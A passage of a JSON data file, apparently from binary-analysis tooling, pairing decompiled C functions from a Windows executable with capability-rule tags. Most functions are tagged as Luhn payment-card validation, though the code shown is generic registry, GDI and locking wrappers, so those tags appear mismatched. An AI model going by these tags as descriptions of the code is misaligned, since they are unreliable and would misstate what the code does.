        "decompiled_code": "\nvoid __fastcall fcn.0042164c(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack72;\n    uint uStack68;\n    uchar *puStack64;\n    uint var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t var_ch;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    puStack64 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack68 = 0x421704;\n    uStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb8;\n    var_8h = param_2;\n    (**(*param_2 + 0x44))();\n    cVar1 = fcn.004215e4();\n    if (cVar1 != '\\0') {\n        fcn.0040555c();\n        if (-1 < var_28h + -1) {\n            iVar3 = 0;\n            do {\n                var_ch = var_24h + 1;\n                uVar2 = fcn.004058fc(&fcn.0042164c::var_ch, 0, 0, 0, 0);\n                sub.advapi32.dll_RegEnumKeyExA(*(in_EAX + 4), iVar3, uVar2);\n                fcn.004058fc();\n                fcn.00405664();\n                (**(*var_8h + 0x38))();\n                iVar3 = iVar3 + 1;\n                var_28h = var_28h + -1;\n            } while (var_28h != 0);\n        }\n    }\n    *in_FS_OFFSET = uStack72;\n    puStack64 = 0x42170b;\n    uStack68 = 0x4216fb;\n    fcn.0040546c();\n    uStack68 = 0x421703;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 471
    },
    "00421714": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00421714(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack72;\n    uint uStack68;\n    uchar *puStack64;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_ch;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    puStack64 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack68 = 0x4217cc;\n    uStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb8;\n    var_8h = param_2;\n    (**(*param_2 + 0x44))();\n    cVar1 = fcn.004215e4();\n    if (cVar1 != '\\0') {\n        fcn.0040555c();\n        if (-1 < var_20h + -1) {\n            iVar3 = 0;\n            do {\n                var_ch = var_1ch + 1;\n                uVar2 = fcn.004058fc(&fcn.00421714::var_ch, 0, 0, 0, 0);\n                sub.advapi32.dll_RegEnumValueA(*(in_EAX + 4), iVar3, uVar2);\n                fcn.004058fc();\n                fcn.00405664();\n                (**(*var_8h + 0x38))();\n                iVar3 = iVar3 + 1;\n                var_20h = var_20h + -1;\n            } while (var_20h != 0);\n        }\n    }\n    *in_FS_OFFSET = uStack72;\n    puStack64 = 0x4217d3;\n    uStack68 = 0x4217c3;\n    fcn.0040546c();\n    uStack68 = 0x4217cb;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 479
    },
    "0042182c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0042182c(void)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint uStack12;\n    \n    cVar1 = fcn.004217dc();\n    uVar2 = uStack12;\n    if (cVar1 == '\\0') {\n        uVar2 = 0xffffffff;\n    }\n    return CONCAT44(uStack12, uVar2);\n}\n",
        "token_count": 87
    },
    "00421854": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00421854(void)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint8_t uStack16;\n    uint uStack12;\n    \n    cVar1 = fcn.004217dc();\n    if (cVar1 == '\\0') {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = uStack16;\n    }\n    return CONCAT44(uStack12, uVar2);\n}\n",
        "token_count": 100
    },
    "004219fc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "set registry value"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004219fc(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.00420ee0();\n    uVar1 = fcn.004058fc(0, uVar1, var_4h, arg_ch);\n    iVar2 = sub.advapi32.dll_RegSetValueExA(*(in_EAX + 4), uVar1);\n    if (iVar2 != 0) {\n        var_8h._0_1_ = 0xb;\n        fcn.0040db68(0, &var_ch);\n        fcn.00404eb4();\n    }\n    return;\n}\n",
        "token_count": 191
    },
    "00421a64": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00421a64(uchar *arg_8h, uint arg_ch)\n\n{\n    uchar uVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    uVar2 = fcn.004058fc(0, &var_4h);\n    iVar3 = sub.advapi32.dll_RegQueryValueExA_1(*(in_EAX + 4), uVar2);\n    if (iVar3 != 0) {\n        var_8h._0_1_ = 0xb;\n        fcn.0040db68(0, &var_ch);\n        fcn.00404eb4();\n    }\n    uVar1 = fcn.00420f10();\n    *arg_8h = uVar1;\n    return arg_ch;\n}\n",
        "token_count": 219
    },
    "00421ad8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00421ad8(void)\n\n{\n    fcn.004217dc();\n    return;\n}\n",
        "token_count": 24
    },
    "00421ae8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00421ae8(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack28 = 0x421b6e;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack32;\n    fcn.00405504();\n    cVar1 = fcn.00420ecc();\n    if (cVar1 == '\\0') {\n        fcn.004059a4();\n    }\n    var_8h = 0;\n    uVar2 = fcn.004058fc(0, *(in_EAX + 0x18), &var_8h);\n    uVar2 = fcn.00421064(uVar2);\n    sub.advapi32.dll_RegOpenKeyExA_1();\n    *in_FS_OFFSET = uVar2;\n    fcn.0040546c(0x421b75);\n    return;\n}\n",
        "token_count": 266
    },
    "00421b80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00421b80(void)\n\n{\n    uint32_t uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack36;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_ch;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uVar1 = *(in_EAX + 0x18);\n    uStack28 = 0x421be5;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    *(in_EAX + 0x18) = uVar1 & 0x300 | 0x20009;\n    iStack36 = 0x421bbc;\n    iVar2 = fcn.00421ae8();\n    if (iVar2 != 0) {\n        sub.advapi32.dll_RegCloseKey_1();\n        iStack36 = iVar2;\n    }\n    *in_FS_OFFSET = iStack36;\n    *(in_EAX + 0x18) = uVar1;\n    return;\n}\n",
        "token_count": 259
    },
    "00421bf8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00421bf8(int32_t arg_8h)\n\n{\n    int32_t arg_ch;\n    uint arg_ch_00;\n    uint32_t arg_8h_00;\n    uint32_t *in_FS_OFFSET;\n    uint32_t uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint32_t uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint32_t uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint8_t var_11h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = *(*(arg_8h + -4) + 4);\n    puStack36 = 0x421c1d;\n    fcn.00421078();\n    uStack40 = 0x421d0b;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack48 = 0x421c38;\n    puStack36 = &stack0xfffffffc;\n    arg_ch = fcn.0042182c();\n    if (0 < arg_ch) {\n        puStack48 = 0x421c49;\n        var_10h = fcn.00402ed8();\n        uStack52 = 0x421ce8;\n        uStack56 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffc8;\n        puStack68 = 0x421c6f;\n        puStack48 = &stack0xfffffffc;\n        arg_ch_00 = fcn.00421a64(&stack0xffffffeb, arg_ch);\n        var_ch = *(*(arg_8h + -4) + 4);\n        puStack68 = 0x421c8b;\n        fcn.00421078();\n        uStack72 = 0x421ccb;\n        uStack76 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffb4;\n        arg_8h_00 = var_11h;\n        puStack68 = &stack0xfffffffc;\n        fcn.004219fc(arg_8h_00, arg_ch_00);\n        *in_FS_OFFSET = arg_8h_00;\n        uStack76 = 0x421cd2;\n        fcn.00421078();\n        return;\n    }\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x421d12;\n    uStack40 = 0x421d0a;\n    fcn.00421078();\n    return;\n}\n",
        "token_count": 582
    },
    "00421d18": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00421d18(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint arg_8h_00;\n    uint uStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack68 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack72 = 0x421e2f;\n    uStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    puStack80 = 0x421d55;\n    fcn.00421078();\n    uStack84 = 0x421e0a;\n    uStack88 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa8;\n    puStack80 = &stack0xfffffffc;\n    cVar1 = fcn.004215e4();\n    if (cVar1 != '\\0') {\n        fcn.00421bf8(arg_8h);\n        fcn.0040555c();\n        if (-1 < var_24h + -1) {\n            do {\n                var_ch = var_20h + 1;\n                fcn.004058fc(&fcn.00421d18::var_ch, 0, 0, 0, 0);\n                iVar2 = sub.advapi32.dll_RegEnumValueA();\n                if (iVar2 == 0) {\n                    arg_8h_00 = arg_8h;\n                    fcn.004058fc();\n                    fcn.00405664();\n                    fcn.00421bf8(arg_8h_00);\n                }\n                var_24h = var_24h + -1;\n            } while (var_24h != 0);\n        }\n    }\n    *in_FS_OFFSET = uStack88;\n    puStack80 = 0x421e11;\n    uStack84 = 0x421e09;\n    fcn.00421078();\n    return;\n}\n",
        "token_count": 520
    },
    "00423134": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00423134(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((in_EAX != 0) && (in_EAX != *0x4979f8)) {\n        sub.gdi32.dll_DeleteObject();\n    }\n    return;\n}\n",
        "token_count": 60
    },
    "00423230": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00423230(ushort param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    ushort extraout_CX;\n    char extraout_DL;\n    int32_t *in_FS_OFFSET;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_1 = extraout_CX;\n        param_2 = extraout_DL;\n    }\n    *(in_EAX + 0x20) = param_1;\n    sub.kernel32.dll_InitializeCriticalSection();\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = in_EAX + 8;\n    }\n    return in_EAX;\n}\n",
        "token_count": 165
    },
    "00423290": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00423290(void)\n\n{\n    int32_t in_EAX;\n    \n    sub.kernel32.dll_EnterCriticalSection(in_EAX + 8);\n    return;\n}\n",
        "token_count": 38
    },
    "0042329c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0042329c(void)\n\n{\n    int32_t in_EAX;\n    \n    sub.kernel32.dll_LeaveCriticalSection(in_EAX + 8);\n    return;\n}\n",
        "token_count": 40
    },
    "00423450": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00423450(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x423469;\n    fcn.00423290();\n    uStack32 = 0x4234b9;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    iVar1 = *(param_2 + 0x10);\n    puStack28 = &stack0xfffffffc;\n    iVar2 = fcn.004232a8();\n    *(param_2 + 0x10) = iVar2;\n    if (iVar1 != iVar2) {\n        fcn.0040483c();\n    }\n    fcn.0042338c();\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x4234c0;\n    uStack32 = 0x4234b8;\n    fcn.0042329c();\n    return;\n}\n",
        "token_count": 263
    },
    "004235b8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.004235b8(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    puStack24 = 0x4235cf;\n    iVar1 = fcn.00419b48();\n    uStack28 = 0x423655;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    while (var_4h < *(iVar1 + 8)) {\n        fcn.004197d8();\n        fcn.00424c44();\n        var_4h = var_4h + 1;\n        fcn.00424ee4();\n    }\n    fcn.00423548();\n    fcn.00423548();\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x42365c;\n    if (-1 < var_4h + -1) {\n        do {\n            uStack28 = 0x423641;\n            fcn.004197d8();\n            uStack28 = 0x423646;\n            fcn.00424db4();\n            var_4h = var_4h + -1;\n        } while (var_4h != 0);\n    }\n    uStack28 = 0x423654;\n    fcn.00419bac();\n    return;\n}\n",
        "token_count": 345
    },
    "00423d9c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00423d9c(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    *0x490b64 = 0;\n    uVar1 = fcn.004232a8();\n    *(in_EAX + 0x10) = uVar1;\n    *(in_EAX + 0x18) = 0xff000008;\n    *(in_EAX + 0x1c) = *0x497a00;\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 209
    },
    "00423e34": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00423e34(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = 0x423e4f;\n    cVar1 = fcn.004047cc();\n    if (cVar1 != '\\0') {\n        puStack20 = 0x423e5f;\n        fcn.00423ae8();\n        uStack24 = 0x423eef;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe4;\n        puStack32 = 0x423e77;\n        puStack20 = &stack0xfffffffc;\n        fcn.00423ae8();\n        uStack36 = 0x423ed2;\n        uStack40 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd8;\n        puStack32 = &stack0xfffffffc;\n        fcn.004234cc();\n        fcn.00423f70();\n        if (*(in_EAX + 0x1c) != *(param_2 + 0x1c)) {\n            fcn.004242b4();\n            fcn.004242d0();\n        }\n        *in_FS_OFFSET = uStack40;\n        puStack32 = 0x423ed9;\n        uStack36 = 0x423ed1;\n        fcn.00423af8();\n        return;\n    }\n    puStack20 = 0x423f01;\n    fcn.00419d80();\n    return;\n}\n",
        "token_count": 405
    },
    "004241ec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004241ec(void)\n\n{\n    fcn.00423cdc();\n    fcn.00423f20();\n    return;\n}\n",
        "token_count": 32
    },
    "00424218": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00424218(void)\n\n{\n    fcn.00423f08();\n    fcn.00423f20();\n    return;\n}\n",
        "token_count": 33
    },
    "004242fc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004242fc(uint param_1, uchar param_2)\n\n{\n    fcn.00423f08(param_2);\n    fcn.00423f20();\n    return;\n}\n",
        "token_count": 46
    },
    "004243b8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004243b8(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    uVar1 = fcn.004232a8();\n    *(in_EAX + 0x10) = uVar1;\n    *(in_EAX + 0x18) = 4;\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 174
    },
    "00424424": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00424424(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = 0x42443f;\n    cVar1 = fcn.004047cc();\n    if (cVar1 != '\\0') {\n        puStack20 = 0x42444f;\n        fcn.00423ae8();\n        uStack24 = 0x4244c4;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe4;\n        puStack32 = 0x424467;\n        puStack20 = &stack0xfffffffc;\n        fcn.00423ae8();\n        uStack36 = 0x4244a7;\n        uStack40 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd8;\n        puStack32 = &stack0xfffffffc;\n        fcn.004234cc();\n        fcn.0042460c();\n        *in_FS_OFFSET = uStack40;\n        puStack32 = 0x4244ae;\n        uStack36 = 0x4244a6;\n        fcn.00423af8();\n        return;\n    }\n    puStack20 = 0x4244d6;\n    fcn.00419d80();\n    return;\n}\n",
        "token_count": 339
    },
    "0042454c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0042454c(void)\n\n{\n    fcn.004244dc();\n    fcn.004244f4();\n    return;\n}\n",
        "token_count": 33
    },
    "00424684": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00424684(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    uVar1 = fcn.004232a8();\n    *(in_EAX + 0x10) = uVar1;\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 158
    },
    "004246ec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004246ec(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = 0x424707;\n    cVar1 = fcn.004047cc();\n    if (cVar1 != '\\0') {\n        puStack20 = 0x424713;\n        fcn.00423ae8();\n        uStack24 = 0x42477c;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe4;\n        puStack32 = 0x42472b;\n        puStack20 = &stack0xfffffffc;\n        fcn.00423ae8();\n        uStack36 = 0x42475f;\n        uStack40 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd8;\n        puStack32 = &stack0xfffffffc;\n        fcn.004234cc();\n        *in_FS_OFFSET = uStack40;\n        puStack32 = 0x424766;\n        uStack36 = 0x42475e;\n        fcn.00423af8();\n        return;\n    }\n    puStack20 = 0x42478e;\n    fcn.00419d80();\n    return;\n}\n",
        "token_count": 324
    },
    "00424800": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00424800(uint param_1, uint param_2)\n\n{\n    fcn.004247b0(*0x490dec, *0x490df0, param_2, *0x490df8);\n    return;\n}\n",
        "token_count": 57
    },
    "0042497c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0042497c(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    char extraout_DL;\n    int32_t *in_FS_OFFSET;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    fcn.00404610();\n    sub.kernel32.dll_InitializeCriticalSection();\n    iVar1 = fcn.00423d9c();\n    *(in_EAX + 0xc) = iVar1;\n    *(iVar1 + 0xc) = in_EAX;\n    *(iVar1 + 8) = 0x425114;\n    *(iVar1 + 0x14) = in_EAX + 0x38;\n    iVar1 = fcn.004243b8();\n    *(in_EAX + 0x10) = iVar1;\n    *(iVar1 + 0xc) = in_EAX;\n    *(iVar1 + 8) = 0x425134;\n    *(iVar1 + 0x14) = in_EAX + 0x38;\n    iVar1 = fcn.00424684();\n    *(in_EAX + 0x14) = iVar1;\n    *(iVar1 + 0xc) = in_EAX;\n    *(iVar1 + 8) = 0x425154;\n    *(iVar1 + 0x14) = in_EAX + 0x38;\n    *(in_EAX + 0x20) = 0xcc0020;\n    *(in_EAX + 8) = *0x424a3c;\n    fcn.00419ac0();\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = in_EAX + 0x38;\n    }\n    return in_EAX;\n}\n",
        "token_count": 421
    },
    "00424b24": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00424b24(int32_t *arg_8h)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint *arg_8h_00;\n    uint var_14h;\n    int32_t var_4h;\n    \n    if (arg_8h != NULL) {\n        cVar1 = (**(*arg_8h + 0x1c))();\n        if (cVar1 == '\\0') {\n            (**(*in_EAX + 0x10))();\n            fcn.00424f9c();\n            fcn.00424824();\n            uVar2 = fcn.00423aa4();\n            sub.gdi32.dll_SetBkColor(in_EAX[1], uVar2);\n            uVar2 = fcn.00423aa4();\n            sub.gdi32.dll_SetTextColor(in_EAX[1], uVar2);\n            iVar3 = (**(*arg_8h + 0x20))();\n            iVar3 = iVar3 + var_4h;\n            arg_8h_00 = &var_14h;\n            (**(*arg_8h + 0x2c))();\n            fcn.00418388(arg_8h_00, iVar3);\n            (**(*arg_8h + 0x14))();\n            (**(*in_EAX + 0xc))();\n        }\n    }\n    return;\n}\n",
        "token_count": 321
    },
    "00424d1c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00424d1c(void)\n\n{\n    ulong uStack16;\n    \n    fcn.00424cd4();\n    return uStack16;\n}\n",
        "token_count": 36
    },
    "00424d38": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00424d38(void)\n\n{\n    uint uStack12;\n    \n    fcn.00424cd4();\n    return CONCAT44(uStack12, uStack12);\n}\n",
        "token_count": 41
    },
    "00424e2c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00424e2c(uint param_1, uint *param_2)\n\n{\n    fcn.00424c6c(*param_2, param_2[1]);\n    return;\n}\n",
        "token_count": 48
    },
    "00424f48": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00424f48(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uStack16;\n    uint uStack12;\n    \n    if (param_2 != *(in_EAX + 4)) {\n        if (*(in_EAX + 4) != 0) {\n            fcn.00424ee4();\n            fcn.00424e04();\n            *(in_EAX + 0x18) = uStack16;\n            *(in_EAX + 0x1c) = uStack12;\n            *(in_EAX + 4) = 0;\n            *(in_EAX + 8) = *(in_EAX + 8) & 0xfe;\n        }\n        if (param_2 != 0) {\n            *(in_EAX + 8) = *(in_EAX + 8) | 1;\n            *(in_EAX + 4) = param_2;\n            fcn.00424e2c();\n        }\n    }\n    return;\n}\n",
        "token_count": 230
    },
    "0042521c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0042521c(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint in_stack_fffffecc;\n    uint uStack280;\n    uint uStack276;\n    uchar *puStack272;\n    uint var_104h;\n    uint var_100h;\n    \n    puStack272 = &stack0xfffffffc;\n    uStack276 = 0x4252b8;\n    uStack280 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack280;\n    iVar1 = sub.kernel32.dll_GetLastError_1();\n    if (iVar1 != 0) {\n        in_stack_fffffecc = 0x1000;\n        iVar1 = sub.kernel32.dll_FormatMessageA(0x1000, 0, iVar1, 0x400, &var_100h, 0x100, 0);\n        if (iVar1 != 0) {\n            fcn.004056dc();\n            fcn.0040da70();\n            fcn.00404eb4();\n            goto code_r0x0042529f;\n        }\n    }\n    fcn.004251c8();\ncode_r0x0042529f:\n    *in_FS_OFFSET = in_stack_fffffecc;\n    fcn.0040546c(0x4252bf);\n    return;\n}\n",
        "token_count": 294
    },
    "00425454": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00425454(int32_t param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    return (in_EAX * param_2 + (param_1 - 1U) & ~(param_1 - 1U)) / 8;\n}\n",
        "token_count": 71
    },
    "0042573c": {
        "rules": [
